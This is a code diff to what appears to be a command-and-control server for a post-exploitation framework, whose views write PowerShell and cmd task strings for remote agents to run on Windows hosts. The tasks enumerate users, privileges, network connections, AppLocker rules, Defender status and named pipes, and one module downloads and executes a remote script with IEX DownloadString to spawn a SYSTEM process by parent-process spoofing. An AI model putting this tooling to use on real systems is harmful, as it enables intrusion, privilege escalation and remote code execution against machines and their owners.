@@ -16,7 +16,7 @@ def DirectoryListing(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         path = request.POST['path']
-        task = "ls {}".format(path)
+        task = 'echo "++++++++++++++++++`r`n`t`r`n`t";ls {};echo "++++++++++++++++++`r`n`t`r`n"'.format(path)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -33,7 +33,7 @@ def Applocker(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============AppLocker_Rules===============";Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections;echo "===============AppLocker Policy Test===============";Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============AppLocker_Rules===============";Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections;echo "===============AppLocker_Policy_Test===============";Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -277,7 +277,7 @@ def env_var(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============All_environment_variables===============";Get-ChildItem Env:'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============All_environment_variables===============";Get-ChildItem Env:;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -295,7 +295,7 @@ def Phrase_finder(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         phrase = request.POST['phrase']
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============All_files_contain_"{}"===============";findstr /SIM /C:"{}" *.txt *ini *.cfg *.config *.xml'.format(phrase , phrase)
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============All_files_contain_"{}"===============";findstr /SIM /C:"{}" *.txt *ini *.cfg *.config *.xml;echo "++++++++++++++++++`r`n`t`r`n"'.format(phrase , phrase)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -314,7 +314,7 @@ def IPsWindows(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Interface,IP_and_DNS_information===============";ipconfig /all; echo "===============arp table information===============";arp -a'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Interface_IP_and_DNS_information===============";ipconfig /all; echo "===============arp_table_information===============";arp -a;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -332,7 +332,7 @@ def logged_users(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============LoggedIn_users===============";query user'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============LoggedIn_users===============";query user;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -349,7 +349,7 @@ def Net_Connections(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Network_connections===============";netstat -ano'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Network_connections===============";netstat -ano;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -366,7 +366,7 @@ def Programs(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Installed_programs===============";Get-WmiObject -Class Win32_Product |  select Name, Version;echo ".`r`n`t`r`n"'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Installed_programs===============";Get-WmiObject -Class Win32_Product |  select Name, Version;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -384,7 +384,7 @@ def processes(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Running_processes===============";tasklist /svc;echo "++++++++++++++++++`r`n"'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Running_processes===============";tasklist /svc;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -420,7 +420,7 @@ def winuser_info(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Current_user===============";whoami;echo "===============User_Privileges==============="; whoami /priv;echo "===============User_group_information===============";whoami /groups'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Current_user===============";whoami;echo "===============User_Privileges==============="; whoami /priv;echo "===============User_group_information===============";whoami /groups;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -437,7 +437,7 @@ def Systeminfo(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============System_Info===============";systeminfo;echo "===============Get_Password_Policy_and_Other_Account_Information===============";net accounts;echo "===============All_system_users===============";net user;echo "===============All_system_groups===============";net localgroup'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============System_Info===============";systeminfo;echo "===============Get_Password_Policy_and_Other_Account_Information===============";net accounts;echo "===============All_system_users===============";net user;echo "===============All_system_groups===============";net localgroup;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -457,7 +457,7 @@ def UpdatesWindows(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Patches_and_Updates===============";wmic qfe;Get-HotFix | ft -AutoSize'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Patches_and_Updates===============";wmic qfe;Get-HotFix | ft -AutoSize;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -495,7 +495,7 @@ def WinDefStat(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Windows_Defender_Status===============";Get-MpComputerStatus'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Windows_Defender_Status===============";Get-MpComputerStatus;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -513,7 +513,7 @@ def Named_pipes(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============List_named_pipes===============";(get-childitem \\\.\pipe\).FullName'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============List_named_pipes===============";(get-childitem \\\.\pipe\).FullName;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -529,7 +529,7 @@ def Perm_pip(request , agent='',named_pip_name=''):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Review permissions on a named pipe===============";cmd;accesschk.exe /accepteula \\.\Pipe\{} -v'.format(named_pip_name)
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Review permissions on a named pipe===============";cmd;accesschk.exe /accepteula \\.\Pipe\{} -v;echo "++++++++++++++++++`r`n`t`r`n"'.format(named_pip_name)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -609,7 +609,7 @@ def tasklist (request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         
-        task = 'tasklist'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Task List===============";tasklist;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -626,10 +626,10 @@ def exploitParentProcess(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
+        fileURL=request.POST['fileURL']  #the PoCScript "psgetsys.ps1"
         system_pid = request.POST['system_pid']    
         path_to_execute = request.POST['path_to_execute']
-        #give user note in GUI to transfer the PoCScript  first --> psgetsys.ps1
-        task = "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1');[MyProcess]::CreateProcessFromParent({},'{}','')".format(system_pid,path_to_execute)
+        task = "IEX(New-Object Net.WebClient).DownloadString('{}');[MyProcess]::CreateProcessFromParent({},'{}','')".format(fileURL,system_pid,path_to_execute)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
